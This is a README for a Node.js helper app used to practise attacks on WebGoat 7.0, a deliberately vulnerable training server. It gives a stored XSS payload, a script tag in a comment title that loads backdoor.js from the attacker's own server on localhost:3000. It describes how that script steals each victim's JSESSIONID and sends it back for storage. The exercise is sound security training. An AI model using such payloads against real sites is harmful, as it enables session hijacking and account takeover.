# webGoatHack
A small node.js app for exercising with WebGoat 7.0

# WebGoat
WebGoat is a special web server application for training various security attacks. To read more what is it and how to install it proceed to the [link](https://github.com/WebGoat/WebGoat/)

# Hack App install and run
Please, clone the repo to you computer and then install node dependencies by executing
```
npm install
```
To ran hack application type 
```
npm start
```
The application will starts at `http://localhost:3000/`

# Attack
I perform storedXSS attack by putting into the title of the comment this content
```
Cool site <script src='http://localhost:3000/backdoor.js'></script>
```
I came to this two level approach only because I want to perform attack once per user session. 
Thats why one script gets `JSESSIONID` and sends it as GET parameter. Then I can parse and save them in Express app.
And once this `JSESSIONID` have been stored, I don't perform attack any more. 


